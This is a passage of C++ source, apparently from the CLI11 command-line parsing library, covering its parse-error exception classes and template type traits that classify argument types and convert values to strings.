            RequiresError(std::string curname, std::string subname)
            : RequiresError(curname + " requires " + subname, ExitCodes::RequiresError) {}
    };

    /// Thrown when an excludes option is present
    class ExcludesError : public ParseError {
        CLI11_ERROR_DEF(ParseError, ExcludesError)
            ExcludesError(std::string curname, std::string subname)
            : ExcludesError(curname + " excludes " + subname, ExitCodes::ExcludesError) {}
    };

    /// Thrown when too many positionals or options are found
    class ExtrasError : public ParseError {
        CLI11_ERROR_DEF(ParseError, ExtrasError)
            explicit ExtrasError(std::vector<std::string> args)
            : ExtrasError((args.size() > 1 ? "The following arguments were not expected: "
                : "The following argument was not expected: ") +
                detail::rjoin(args, " "),
                ExitCodes::ExtrasError) {}
        ExtrasError(const std::string& name, std::vector<std::string> args)
            : ExtrasError(name,
                (args.size() > 1 ? "The following arguments were not expected: "
                    : "The following argument was not expected: ") +
                detail::rjoin(args, " "),
                ExitCodes::ExtrasError) {}
    };

    /// Thrown when extra values are found in an INI file
    class ConfigError : public ParseError {
        CLI11_ERROR_DEF(ParseError, ConfigError)
            CLI11_ERROR_SIMPLE(ConfigError)
            static ConfigError Extras(std::string item) { return ConfigError("INI was not able to parse " + item); }
        static ConfigError NotConfigurable(std::string item) {
            return ConfigError(item + ": This option is not allowed in a configuration file");
        }
    };

    /// Thrown when validation fails before parsing
    class InvalidError : public ParseError {
        CLI11_ERROR_DEF(ParseError, InvalidError)
            explicit InvalidError(std::string name)
            : InvalidError(name + ": Too many positional arguments with unlimited expected args", ExitCodes::InvalidError) {
        }
    };

    /// This is just a safety check to verify selection and parsing match - you should not ever see it
    /// Strings are directly added to this error, but again, it should never be seen.
    class HorribleError : public ParseError {
        CLI11_ERROR_DEF(ParseError, HorribleError)
            CLI11_ERROR_SIMPLE(HorribleError)
    };

    // After parsing

    /// Thrown when counting a nonexistent option
    class OptionNotFound : public Error {
        CLI11_ERROR_DEF(Error, OptionNotFound)
            explicit OptionNotFound(std::string name) : OptionNotFound(name + " not found", ExitCodes::OptionNotFound) {}
    };

#undef CLI11_ERROR_DEF
#undef CLI11_ERROR_SIMPLE

    /// @}




    // Type tools

    // Utilities for type enabling
    namespace detail {
        // Based generally on https://rmf.io/cxx11/almost-static-if
        /// Simple empty scoped class
        enum class enabler {};

        /// An instance to use in EnableIf
        constexpr enabler dummy = {};
    }  // namespace detail

    /// A copy of enable_if_t from C++14, compatible with C++11.
    ///
    /// We could check to see if C++14 is being used, but it does not hurt to redefine this
    /// (even Google does this: https://github.com/google/skia/blob/main/include/private/SkTLogic.h)
    /// It is not in the std namespace anyway, so no harm done.
    template <bool B, class T = void> using enable_if_t = typename std::enable_if<B, T>::type;

    /// A copy of std::void_t from C++17 (helper for C++11 and C++14)
    template <typename... Ts> struct make_void {
        using type = void;
    };

    /// A copy of std::void_t from C++17 - same reasoning as enable_if_t, it does not hurt to redefine
    template <typename... Ts> using void_t = typename make_void<Ts...>::type;

    /// A copy of std::conditional_t from C++14 - same reasoning as enable_if_t, it does not hurt to redefine
    template <bool B, class T, class F> using conditional_t = typename std::conditional<B, T, F>::type;

    /// Check to see if something is bool (fail check by default)
    template <typename T> struct is_bool : std::false_type {};

    /// Check to see if something is bool (true if actually a bool)
    template <> struct is_bool<bool> : std::true_type {};

    /// Check to see if something is a shared pointer
    template <typename T> struct is_shared_ptr : std::false_type {};

    /// Check to see if something is a shared pointer (True if really a shared pointer)
    template <typename T> struct is_shared_ptr<std::shared_ptr<T>> : std::true_type {};

    /// Check to see if something is a shared pointer (True if really a shared pointer)
    template <typename T> struct is_shared_ptr<const std::shared_ptr<T>> : std::true_type {};

    /// Check to see if something is copyable pointer
    template <typename T> struct is_copyable_ptr {
        static bool const value = is_shared_ptr<T>::value || std::is_pointer<T>::value;
    };

    /// This can be specialized to override the type deduction for IsMember.
    template <typename T> struct IsMemberType {
        using type = T;
    };

    /// The main custom type needed here is const char * should be a string.
    template <> struct IsMemberType<const char*> {
        using type = std::string;
    };

    namespace adl_detail {
        /// Check for existence of user-supplied lexical_cast.
        ///
        /// This struct has to be in a separate namespace so that it doesn't see our lexical_cast overloads in CLI::detail.
        /// Standard says it shouldn't see them if it's defined before the corresponding lexical_cast declarations, but this
        /// requires a working implementation of two-phase lookup, and not all compilers can boast that (msvc, ahem).
        template <typename T, typename S = std::string> class is_lexical_castable {
            template <typename TT, typename SS>
            static auto test(int) -> decltype(lexical_cast(std::declval<const SS&>(), std::declval<TT&>()), std::true_type());

            template <typename, typename> static auto test(...) -> std::false_type;

        public:
            static constexpr bool value = decltype(test<T, S>(0))::value;
        };
    }  // namespace adl_detail

    namespace detail {

        // These are utilities for IsMember and other transforming objects

        /// Handy helper to access the element_type generically. This is not part of is_copyable_ptr because it requires that
        /// pointer_traits<T> be valid.

        /// not a pointer
        template <typename T, typename Enable = void> struct element_type {
            using type = T;
        };

        template <typename T> struct element_type<T, typename std::enable_if<is_copyable_ptr<T>::value>::type> {
            using type = typename std::pointer_traits<T>::element_type;
        };

        /// Combination of the element type and value type - remove pointer (including smart pointers) and get the value_type of
        /// the container
        template <typename T> struct element_value_type {
            using type = typename element_type<T>::type::value_type;
        };

        /// Adaptor for set-like structure: This just wraps a normal container in a few utilities that do almost nothing.
        template <typename T, typename _ = void> struct pair_adaptor : std::false_type {
            using value_type = typename T::value_type;
            using first_type = typename std::remove_const<value_type>::type;
            using second_type = typename std::remove_const<value_type>::type;

            /// Get the first value (really just the underlying value)
            template <typename Q> static auto first(Q&& pair_value) -> decltype(std::forward<Q>(pair_value)) {
                return std::forward<Q>(pair_value);
            }
            /// Get the second value (really just the underlying value)
            template <typename Q> static auto second(Q&& pair_value) -> decltype(std::forward<Q>(pair_value)) {
                return std::forward<Q>(pair_value);
            }
        };

        /// Adaptor for map-like structure (true version, must have key_type and mapped_type).
        /// This wraps a mapped container in a few utilities access it in a general way.
        template <typename T>
        struct pair_adaptor<
            T,
            conditional_t<false, void_t<typename T::value_type::first_type, typename T::value_type::second_type>, void>>
            : std::true_type {
            using value_type = typename T::value_type;
            using first_type = typename std::remove_const<typename value_type::first_type>::type;
            using second_type = typename std::remove_const<typename value_type::second_type>::type;

            /// Get the first value (really just the underlying value)
            template <typename Q> static auto first(Q&& pair_value) -> decltype(std::get<0>(std::forward<Q>(pair_value))) {
                return std::get<0>(std::forward<Q>(pair_value));
            }
            /// Get the second value (really just the underlying value)
            template <typename Q> static auto second(Q&& pair_value) -> decltype(std::get<1>(std::forward<Q>(pair_value))) {
                return std::get<1>(std::forward<Q>(pair_value));
            }
        };

        // Warning is suppressed due to "bug" in gcc<5.0 and gcc 7.0 with c++17 enabled that generates a -Wnarrowing warning
        // in the unevaluated context even if the function that was using this wasn't used.  The standard says narrowing in
        // brace initialization shouldn't be allowed but for backwards compatibility gcc allows it in some contexts.  It is a
        // little fuzzy what happens in template constructs and I think that was something GCC took a little while to work out.
        // But regardless some versions of gcc generate a warning when they shouldn't from the following code so that should be
        // suppressed
#ifdef __GNUC__
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wnarrowing"
#endif
// check for constructibility from a specific type and copy assignable used in the parse detection
        template <typename T, typename C> class is_direct_constructible {
            template <typename TT, typename CC>
            static auto test(int, std::true_type) -> decltype(
                // NVCC warns about narrowing conversions here
#ifdef __CUDACC__
#ifdef __NVCC_DIAG_PRAGMA_SUPPORT__
#pragma nv_diag_suppress 2361
#else
#pragma diag_suppress 2361
#endif
#endif
                TT{ std::declval<CC>() }
#ifdef __CUDACC__
#ifdef __NVCC_DIAG_PRAGMA_SUPPORT__
#pragma nv_diag_default 2361
#else
#pragma diag_default 2361
#endif
#endif
                ,
                std::is_move_assignable<TT>());

            template <typename TT, typename CC> static auto test(int, std::false_type) -> std::false_type;

            template <typename, typename> static auto test(...) -> std::false_type;

        public:
            static constexpr bool value = decltype(test<T, C>(0, typename std::is_constructible<T, C>::type()))::value;
        };
#ifdef __GNUC__
#pragma GCC diagnostic pop
#endif

        // Check for output streamability
        // Based on https://stackoverflow.com/questions/22758291/how-can-i-detect-if-a-type-can-be-streamed-to-an-stdostream

        template <typename T, typename S = std::ostringstream> class is_ostreamable {
            template <typename TT, typename SS>
            static auto test(int) -> decltype(std::declval<SS&>() << std::declval<TT>(), std::true_type());

            template <typename, typename> static auto test(...) -> std::false_type;

        public:
            static constexpr bool value = decltype(test<T, S>(0))::value;
        };

        /// Check for input streamability
        template <typename T, typename S = std::istringstream> class is_istreamable {
            template <typename TT, typename SS>
            static auto test(int) -> decltype(std::declval<SS&>() >> std::declval<TT&>(), std::true_type());

            template <typename, typename> static auto test(...) -> std::false_type;

        public:
            static constexpr bool value = decltype(test<T, S>(0))::value;
        };

        /// Check for complex
        template <typename T> class is_complex {
            template <typename TT>
            static auto test(int) -> decltype(std::declval<TT>().real(), std::declval<TT>().imag(), std::true_type());

            template <typename> static auto test(...) -> std::false_type;

        public:
            static constexpr bool value = decltype(test<T>(0))::value;
        };

        /// Templated operation to get a value from a stream
        template <typename T, enable_if_t<is_istreamable<T>::value, detail::enabler> = detail::dummy>
        bool from_stream(const std::string& istring, T& obj) {
            std::istringstream is;
            is.str(istring);
            is >> obj;
            return !is.fail() && !is.rdbuf()->in_avail();
        }

        template <typename T, enable_if_t<!is_istreamable<T>::value, detail::enabler> = detail::dummy>
        bool from_stream(const std::string& /*istring*/, T& /*obj*/) {
            return false;
        }

        // check to see if an object is a mutable container (fail by default)
        template <typename T, typename _ = void> struct is_mutable_container : std::false_type {};

        /// type trait to test if a type is a mutable container meaning it has a value_type, it has an iterator, a clear, and
        /// end methods and an insert function.  And for our purposes we exclude std::string and types that can be constructed
        /// from a std::string
        template <typename T>
        struct is_mutable_container<
            T,
            conditional_t<false,
            void_t<typename T::value_type,
            decltype(std::declval<T>().end()),
            decltype(std::declval<T>().clear()),
            decltype(std::declval<T>().insert(std::declval<decltype(std::declval<T>().end())>(),
                std::declval<const typename T::value_type&>()))>,
            void>> : public conditional_t<std::is_constructible<T, std::string>::value ||
            std::is_constructible<T, std::wstring>::value,
            std::false_type,
            std::true_type>{};

        // check to see if an object is a mutable container (fail by default)
        template <typename T, typename _ = void> struct is_readable_container : std::false_type {};

        /// type trait to test if a type is a container meaning it has a value_type, it has an iterator, and an end
        /// method.
        template <typename T>
        struct is_readable_container<
            T,
            conditional_t<false, void_t<decltype(std::declval<T>().end()), decltype(std::declval<T>().begin())>, void>>
            : public std::true_type {};

        // check to see if an object is a wrapper (fail by default)
        template <typename T, typename _ = void> struct is_wrapper : std::false_type {};

        // check if an object is a wrapper (it has a value_type defined)
        template <typename T>
        struct is_wrapper<T, conditional_t<false, void_t<typename T::value_type>, void>> : public std::true_type {};

        // Check for tuple like types, as in classes with a tuple_size type trait
        // Even though in C++26 std::complex gains a std::tuple interface, for our purposes we treat is as NOT a tuple
        template <typename S> class is_tuple_like {
            template <typename SS, enable_if_t<!is_complex<SS>::value, detail::enabler> = detail::dummy>
            // static auto test(int)
            //     -> decltype(std::conditional<(std::tuple_size<SS>::value > 0), std::true_type, std::false_type>::type());
            static auto test(int) -> decltype(std::tuple_size<typename std::decay<SS>::type>::value, std::true_type{});
            template <typename> static auto test(...) -> std::false_type;

        public:
            static constexpr bool value = decltype(test<S>(0))::value;
        };

        /// This will only trigger for actual void type
        template <typename T, typename Enable = void> struct type_count_base {
            static const int value{ 0 };
        };

        /// Type size for regular object types that do not look like a tuple
        template <typename T>
        struct type_count_base<T,
            typename std::enable_if<!is_tuple_like<T>::value && !is_mutable_container<T>::value &&
            !std::is_void<T>::value>::type> {
            static constexpr int value{ 1 };
        };

        /// the base tuple size
        template <typename T>
        struct type_count_base<T, typename std::enable_if<is_tuple_like<T>::value && !is_mutable_container<T>::value>::type> {
            static constexpr int value{// cppcheck-suppress unusedStructMember
                                       std::tuple_size<typename std::decay<T>::type>::value };
        };

        /// Type count base for containers is the type_count_base of the individual element
        template <typename T> struct type_count_base<T, typename std::enable_if<is_mutable_container<T>::value>::type> {
            static constexpr int value{ type_count_base<typename T::value_type>::value };
        };

        /// Convert an object to a string (directly forward if this can become a string)
        template <typename T, enable_if_t<std::is_convertible<T, std::string>::value, detail::enabler> = detail::dummy>
        auto to_string(T&& value) -> decltype(std::forward<T>(value)) {
            return std::forward<T>(value);
        }

        /// Construct a string from the object
        template <typename T,
            enable_if_t<std::is_constructible<std::string, T>::value && !std::is_convertible<T, std::string>::value,
            detail::enabler> = detail::dummy>
        std::string to_string(T&& value) {
            return std::string(value);  // NOLINT(google-readability-casting)
        }

        /// Convert an object to a string (streaming must be supported for that type)
        template <typename T,
            enable_if_t<!std::is_convertible<T, std::string>::value && !std::is_constructible<std::string, T>::value&&
            is_ostreamable<T>::value,
            detail::enabler> = detail::dummy>
        std::string to_string(T&& value) {
            std::stringstream stream;
            stream << value;
            return stream.str();
        }

        // additional forward declarations

        /// Print tuple value string for tuples of size ==1
        template <typename T,
            enable_if_t<!std::is_convertible<T, std::string>::value && !std::is_constructible<std::string, T>::value &&
            !is_ostreamable<T>::value&& is_tuple_like<T>::value&& type_count_base<T>::value == 1,
            detail::enabler> = detail::dummy>
        inline std::string to_string(T&& value);

        /// Print tuple value string for tuples of size > 1
        template <typename T,
            enable_if_t<!std::is_convertible<T, std::string>::value && !std::is_constructible<std::string, T>::value &&
            !is_ostreamable<T>::value&& is_tuple_like<T>::value&& type_count_base<T>::value >= 2,
            detail::enabler> = detail::dummy>
        inline std::string to_string(T&& value);

        /// If conversion is not supported, return an empty string (streaming is not supported for that type)
        template <
            typename T,
            enable_if_t<!std::is_convertible<T, std::string>::value && !std::is_constructible<std::string, T>::value &&
            !is_ostreamable<T>::value && !is_readable_container<typename std::remove_const<T>::type>::value &&
            !is_tuple_like<T>::value,
            detail::enabler> = detail::dummy>
        inline std::string to_string(T&&) {
            return {};
        }

        /// convert a readable container to a string
        template <typename T,
            enable_if_t<!std::is_convertible<T, std::string>::value && !std::is_constructible<std::string, T>::value &&
            !is_ostreamable<T>::value&& is_readable_container<T>::value,
            detail::enabler> = detail::dummy>
        inline std::string to_string(T&& variable) {
            auto cval = variable.begin();
            auto end = variable.end();
            if (cval == end) {
                return { "{}" };
            }
            std::vector<std::string> defaults;
            while (cval != end) {
                defaults.emplace_back(CLI::detail::to_string(*cval));
                ++cval;
            }
            return { "[" + detail::join(defaults) + "]" };
        }

        /// Convert a tuple like object to a string

        /// forward declarations for tuple_value_strings
        template <typename T, std::size_t I>
        inline typename std::enable_if<I == type_count_base<T>::value, std::string>::type tuple_value_string(T&& /*value*/);

        /// Recursively generate the tuple value string
        template <typename T, std::size_t I>
        inline typename std::enable_if<(I < type_count_base<T>::value), std::string>::type tuple_value_string(T&& value);

        /// Print tuple value string for tuples of size ==1
        template <typename T,
            enable_if_t<!std::is_convertible<T, std::string>::value && !std::is_constructible<std::string, T>::value &&
            !is_ostreamable<T>::value&& is_tuple_like<T>::value&& type_count_base<T>::value == 1,
            detail::enabler>>
            inline std::string to_string(T&& value) {
            return to_string(std::get<0>(value));
        }

        /// Print tuple value string for tuples of size > 1
        template <typename T,
            enable_if_t<!std::is_convertible<T, std::string>::value && !std::is_constructible<std::string, T>::value &&
            !is_ostreamable<T>::value&& is_tuple_like<T>::value&& type_count_base<T>::value >= 2,
            detail::enabler>>
            inline std::string to_string(T&& value) {
            auto tname = std::string(1, '[') + tuple_value_string<T, 0>(value);
            tname.push_back(']');
            return tname;
        }

        /// Empty string if the index > tuple size
        template <typename T, std::size_t I>
        inline typename std::enable_if<I == type_count_base<T>::value, std::string>::type tuple_value_string(T&& /*value*/) {
            return std::string{};
        }

        /// Recursively generate the tuple value string
        template <typename T, std::size_t I>
        inline typename std::enable_if<(I < type_count_base<T>::value), std::string>::type tuple_value_string(T&& value) {
            auto str = std::string{ to_string(std::get<I>(value)) } + ',' + tuple_value_string<T, I + 1>(value);
            if (str.back() == ',')
                str.pop_back();
            return str;
        }

        /// special template overload
        template <typename T1,
            typename T2,
            typename T,
            enable_if_t<std::is_same<T1, T2>::value, detail::enabler> = detail::dummy>
        auto checked_to_string(T&& value) -> decltype(to_string(std::forward<T>(value))) {
            return to_string(std::forward<T>(value));
        }

        /// special template overload
        template <typename T1,
            typename T2,
            typename T,
            enable_if_t<!std::is_same<T1, T2>::value, detail::enabler> = detail::dummy>
        std::string checked_to_string(T&&) {
            return std::string{};
        }
        /// get a string as a convertible value for arithmetic types
        template <typename T, enable_if_t<std::is_arithmetic<T>::value, detail::enabler> = detail::dummy>
        std::string value_string(const T& value) {
            return std::to_string(value);
        }
        /// get a string as a convertible value for enumerations
        template <typename T, enable_if_t<std::is_enum<T>::value, detail::enabler> = detail::dummy>
        std::string value_string(const T& value) {
            return std::to_string(static_cast<typename std::underlying_type<T>::type>(value));
        }
        /// for other types just use the regular to_string function
        template <typename T,
            enable_if_t<!std::is_enum<T>::value && !std::is_arithmetic<T>::value, detail::enabler> = detail::dummy>
        auto value_string(const T& value) -> decltype(to_string(value)) {
            return to_string(value);
        }

        /// template to get the underlying value type if it exists or use a default
        template <typename T, typename def, typename Enable = void> struct wrapped_type {
            using type = def;
        };

        /// Type size for regular object types that do not look like a tuple
        template <typename T, typename def> struct wrapped_type<T, def, typename std::enable_if<is_wrapper<T>::value>::type> {
            using type = typename T::value_type;
        };

        /// Set of overloads to get the type size of an object

        /// forward declare the subtype_count structure
        template <typename T> struct subtype_count;

        /// forward declare the subtype_count_min structure
        template <typename T> struct subtype_count_min;

        /// This will only trigger for actual void type
        template <typename T, typename Enable = void> struct type_count {
            static const int value{ 0 };
        };

        /// Type size for regular object types that do not look like a tuple
        template <typename T>
        struct type_count<T,
            typename std::enable_if<!is_wrapper<T>::value && !is_tuple_like<T>::value && !is_complex<T>::value &&
            !std::is_void<T>::value>::type> {
            static constexpr int value{ 1 };
        };

        /// Type size for complex since it sometimes looks like a wrapper
        template <typename T> struct type_count<T, typename std::enable_if<is_complex<T>::value>::type> {
            static constexpr int value{ 2 };
        };

        /// Type size of types that are wrappers,except complex and tuples(which can also be wrappers sometimes)
        template <typename T> struct type_count<T, typename std::enable_if<is_mutable_container<T>::value>::type> {
            static constexpr int value{ subtype_count<typename T::value_type>::value };
        };

        /// Type size of types that are wrappers,except containers complex and tuples(which can also be wrappers sometimes)
        template <typename T>
        struct type_count<T,
            typename std::enable_if<is_wrapper<T>::value && !is_complex<T>::value && !is_tuple_like<T>::value &&
            !is_mutable_container<T>::value>::type> {
            static constexpr int value{ type_count<typename T::value_type>::value };
        };

        /// 0 if the index > tuple size
        template <typename T, std::size_t I>
        constexpr typename std::enable_if<I == type_count_base<T>::value, int>::type tuple_type_size() {
            return 0;
        }

        /// Recursively generate the tuple type name
        template <typename T, std::size_t I>
        constexpr typename std::enable_if < I<type_count_base<T>::value, int>::type tuple_type_size() {
            return subtype_count<typename std::tuple_element<I, T>::type>::value + tuple_type_size<T, I + 1>();
        }

        /// Get the type size of the sum of type sizes for all the individual tuple types
        template <typename T> struct type_count<T, typename std::enable_if<is_tuple_like<T>::value>::type> {
            static constexpr int value{ tuple_type_size<T, 0>() };
        };

        /// definition of subtype count
        template <typename T> struct subtype_count {
            static constexpr int value{ is_mutable_container<T>::value ? expected_max_vector_size : type_count<T>::value };
        };

        /// This will only trigger for actual void type
        template <typename T, typename Enable = void> struct type_count_min {
            static const int value{ 0 };
        };

        /// Type size for regular object types that do not look like a tuple
        template <typename T>
        struct type_count_min<
            T,
            typename std::enable_if<!is_mutable_container<T>::value && !is_tuple_like<T>::value && !is_wrapper<T>::value &&
            !is_complex<T>::value && !std::is_void<T>::value>::type> {
            static constexpr int value{ type_count<T>::value };
        };

        /// Type size for complex since it sometimes looks like a wrapper
        template <typename T> struct type_count_min<T, typename std::enable_if<is_complex<T>::value>::type> {
            static constexpr int value{ 1 };
        };

        /// Type size min of types that are wrappers,except complex and tuples(which can also be wrappers sometimes)
        template <typename T>
        struct type_count_min<
            T,
            typename std::enable_if<is_wrapper<T>::value && !is_complex<T>::value && !is_tuple_like<T>::value>::type> {
            static constexpr int value{ subtype_count_min<typename T::value_type>::value };
        };

        /// 0 if the index > tuple size
        template <typename T, std::size_t I>
        constexpr typename std::enable_if<I == type_count_base<T>::value, int>::type tuple_type_size_min() {
            return 0;
        }

        /// Recursively generate the tuple type name
        template <typename T, std::size_t I>
        constexpr typename std::enable_if < I<type_count_base<T>::value, int>::type tuple_type_size_min() {
            return subtype_count_min<typename std::tuple_element<I, T>::type>::value + tuple_type_size_min<T, I + 1>();
        }

        /// Get the type size of the sum of type sizes for all the individual tuple types
        template <typename T> struct type_count_min<T, typename std::enable_if<is_tuple_like<T>::value>::type> {
            static constexpr int value{ tuple_type_size_min<T, 0>() };
        };

        /// definition of subtype count
        template <typename T> struct subtype_count_min {
            static constexpr int value{ is_mutable_container<T>::value
                                           ? ((type_count<T>::value < expected_max_vector_size) ? type_count<T>::value : 0)
                                           : type_count_min<T>::value };
        };

        /// This will only trigger for actual void type
        template <typename T, typename Enable = void> struct expected_count {
            static const int value{ 0 };
        };

        /// For most types the number of expected items is 1
        template <typename T>
        struct expected_count<T,
            typename std::enable_if<!is_mutable_container<T>::value && !is_wrapper<T>::value &&
            !std::is_void<T>::value>::type> {
            static constexpr int value{ 1 };
        };
        /// number of expected items in a vector
        template <typename T> struct expected_count<T, typename std::enable_if<is_mutable_container<T>::value>::type> {
            static constexpr int value{ expected_max_vector_size };
        };

        /// number of expected items in a vector
        template <typename T>
        struct expected_count<T, typename std::enable_if<!is_mutable_container<T>::value&& is_wrapper<T>::value>::type> {
            static constexpr int value{ expected_count<typename T::value_type>::value };
        };

        // Enumeration of the different supported categorizations of objects
        enum class object_category : int {
            char_value = 1,
            integral_value = 2,
            unsigned_integral = 4,
            enumeration = 6,
            boolean_value = 8,
            floating_point = 10,
            number_constructible = 12,
            double_constructible = 14,
            integer_constructible = 16,
            // string like types
            string_assignable = 23,
            string_constructible = 24,
            wstring_assignable = 25,
            wstring_constructible = 26,
            other = 45,
            // special wrapper or container types
            wrapper_value = 50,
            complex_number = 60,
            tuple_value = 70,
            container_value = 80,

        };

        /// Set of overloads to classify an object according to type

        /// some type that is not otherwise recognized
        template <typename T, typename Enable = void> struct classify_object {
            static constexpr object_category value{ object_category::other };
        };

        /// Signed integers
        template <typename T>
        struct classify_object<
            T,
            typename std::enable_if<std::is_integral<T>::value && !std::is_same<T, char>::value&& std::is_signed<T>::value &&
            !is_bool<T>::value && !std::is_enum<T>::value>::type> {
            static constexpr object_category value{ object_category::integral_value };
        };

        /// Unsigned integers
        template <typename T>
        struct classify_object<T,
            typename std::enable_if<std::is_integral<T>::value&& std::is_unsigned<T>::value &&
            !std::is_same<T, char>::value && !is_bool<T>::value>::type> {
            static constexpr object_category value{ object_category::unsigned_integral };
        };

        /// single character values
        template <typename T>
        struct classify_object<T, typename std::enable_if<std::is_same<T, char>::value && !std::is_enum<T>::value>::type> {
            static constexpr object_category value{ object_category::char_value };
        };

        /// Boolean values
        template <typename T> struct classify_object<T, typename std::enable_if<is_bool<T>::value>::type> {
            static constexpr object_category value{ object_category::boolean_value };
        };

        /// Floats
        template <typename T> struct classify_object<T, typename std::enable_if<std::is_floating_point<T>::value>::type> {
            static constexpr object_category value{ object_category::floating_point };
        };
#if defined _MSC_VER
        // in MSVC wstring should take precedence if available this isn't as useful on other compilers due to the broader use of
        // utf-8 encoding
#define WIDE_STRING_CHECK                                                                                              \
    !std::is_assignable<T &, std::wstring>::value && !std::is_constructible<T, std::wstring>::value
#define STRING_CHECK true
#else
#define WIDE_STRING_CHECK true
#define STRING_CHECK !std::is_assignable<T &, std::string>::value && !std::is_constructible<T, std::string>::value
#endif

        /// String and similar direct assignment
        template <typename T>
        struct classify_object<
            T,
            typename std::enable_if<!std::is_floating_point<T>::value && !std::is_integral<T>::value&& WIDE_STRING_CHECK&&
            std::is_assignable<T&, std::string>::value>::type> {
            static constexpr object_category value{ object_category::string_assignable };
        };

        /// String and similar constructible and copy assignment
        template <typename T>
        struct classify_object<
            T,
            typename std::enable_if<!std::is_floating_point<T>::value && !std::is_integral<T>::value &&
            !std::is_assignable<T&, std::string>::value && (type_count<T>::value == 1) &&
            WIDE_STRING_CHECK&& std::is_constructible<T, std::string>::value>::type> {
            static constexpr object_category value{ object_category::string_constructible };
        };

        /// Wide strings
        template <typename T>
        struct classify_object<T,
            typename std::enable_if<!std::is_floating_point<T>::value && !std::is_integral<T>::value&&
            STRING_CHECK&& std::is_assignable<T&, std::wstring>::value>::type> {
            static constexpr object_category value{ object_category::wstring_assignable };
        };

        template <typename T>
        struct classify_object<
            T,
            typename std::enable_if<!std::is_floating_point<T>::value && !std::is_integral<T>::value &&
            !std::is_assignable<T&, std::wstring>::value && (type_count<T>::value == 1) &&
            STRING_CHECK&& std::is_constructible<T, std::wstring>::value>::type> {
            static constexpr object_category value{ object_category::wstring_constructible };
        };

        /// Enumerations
        template <typename T> struct classify_object<T, typename std::enable_if<std::is_enum<T>::value>::type> {
            static constexpr object_category value{ object_category::enumeration };
        };

        template <typename T> struct classify_object<T, typename std::enable_if<is_complex<T>::value>::type> {
            static constexpr object_category value{ object_category::complex_number };
        };

        /// Handy helper to contain a bunch of checks that rule out many common types (integers, string like, floating point,
        /// vectors, and enumerations
        template <typename T> struct uncommon_type {
            using type = typename std::conditional<
                !std::is_floating_point<T>::value && !std::is_integral<T>::value &&
                !std::is_assignable<T&, std::string>::value && !std::is_constructible<T, std::string>::value &&
                !std::is_assignable<T&, std::wstring>::value && !std::is_constructible<T, std::wstring>::value &&
                !is_complex<T>::value && !is_mutable_container<T>::value && !std::is_enum<T>::value,
                std::true_type,
                std::false_type>::type;
            static constexpr bool value = type::value;
        };

        /// wrapper type
        template <typename T>
        struct classify_object<T,
            typename std::enable_if<(!is_mutable_container<T>::value&& is_wrapper<T>::value &&
                !is_tuple_like<T>::value&& uncommon_type<T>::value)>::type> {
            static constexpr object_category value{ object_category::wrapper_value };
        };

        /// Assignable from double or int
        template <typename T>
        struct classify_object<T,
            typename std::enable_if<uncommon_type<T>::value&& type_count<T>::value == 1 &&
            !is_wrapper<T>::value&& is_direct_constructible<T, double>::value&&
            is_direct_constructible<T, int>::value>::type> {
            static constexpr object_category value{ object_category::number_constructible };
        };

        /// Assignable from int
        template <typename T>
        struct classify_object<T,
            typename std::enable_if<uncommon_type<T>::value&& type_count<T>::value == 1 &&
            !is_wrapper<T>::value && !is_direct_constructible<T, double>::value&&
            is_direct_constructible<T, int>::value>::type> {
            static constexpr object_category value{ object_category::integer_constructible };
        };

        /// Assignable from double
        template <typename T>
        struct classify_object<T,
            typename std::enable_if<uncommon_type<T>::value&& type_count<T>::value == 1 &&
            !is_wrapper<T>::value&& is_direct_constructible<T, double>::value &&
            !is_direct_constructible<T, int>::value>::type> {
            static constexpr object_category value{ object_category::double_constructible };
        };

        /// Tuple type
        template <typename T>
        struct classify_object<
            T,
            typename std::enable_if<is_tuple_like<T>::value &&
            ((type_count<T>::value >= 2 && !is_wrapper<T>::value) ||
                (uncommon_type<T>::value && !is_direct_constructible<T, double>::value &&
                    !is_direct_constructible<T, int>::value) ||
                (uncommon_type<T>::value && type_count<T>::value >= 2))>::type> {
            static constexpr object_category value{ object_category::tuple_value };
            // the condition on this class requires it be like a tuple, but on some compilers (like Xcode) tuples can be
            // constructed from just the first element so tuples of <string, int,int> can be constructed from a string, which
            // could lead to issues so there are two variants of the condition, the first isolates things with a type size >=2
            // mainly to get tuples on Xcode with the exception of wrappers, the second is the main one and just separating out
            // those cases that are caught by other object classifications
        };

        /// container type
        template <typename T> struct classify_object<T, typename std::enable_if<is_mutable_container<T>::value>::type> {
            static constexpr object_category value{ object_category::container_value };
        };

        // Type name print

        /// Was going to be based on
        ///  http://stackoverflow.com/questions/1055452/c-get-name-of-type-in-template
        /// But this is cleaner and works better in this case

        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::char_value, detail::enabler> = detail::dummy>
        constexpr const char* type_name() {
            return "CHAR";
        }

        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::integral_value ||
            classify_object<T>::value == object_category::integer_constructible,
            detail::enabler> = detail::dummy>
        constexpr const char* type_name() {
            return "INT";
        }

        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::unsigned_integral, detail::enabler> = detail::dummy>
        constexpr const char* type_name() {
            return "UINT";
        }

        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::floating_point ||
            classify_object<T>::value == object_category::number_constructible ||
            classify_object<T>::value == object_category::double_constructible,
            detail::enabler> = detail::dummy>
        constexpr const char* type_name() {
            return "FLOAT";
        }

        /// Print name for enumeration types
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::enumeration, detail::enabler> = detail::dummy>
        constexpr const char* type_name() {
            return "ENUM";
        }

        /// Print name for enumeration types
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::boolean_value, detail::enabler> = detail::dummy>
        constexpr const char* type_name() {
            return "BOOLEAN";
        }

        /// Print name for enumeration types
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::complex_number, detail::enabler> = detail::dummy>
        constexpr const char* type_name() {
            return "COMPLEX";
        }

        /// Print for all other types
        template <typename T,
            enable_if_t<classify_object<T>::value >= object_category::string_assignable &&
            classify_object<T>::value <= object_category::other,
            detail::enabler> = detail::dummy>
        constexpr const char* type_name() {
            return "TEXT";
        }
        /// typename for tuple value
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::tuple_value && type_count_base<T>::value >= 2,
            detail::enabler> = detail::dummy>
        std::string type_name();  // forward declaration

        /// Generate type name for a wrapper or container value
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::container_value ||
            classify_object<T>::value == object_category::wrapper_value,
            detail::enabler> = detail::dummy>
        std::string type_name();  // forward declaration

        /// Print name for single element tuple types
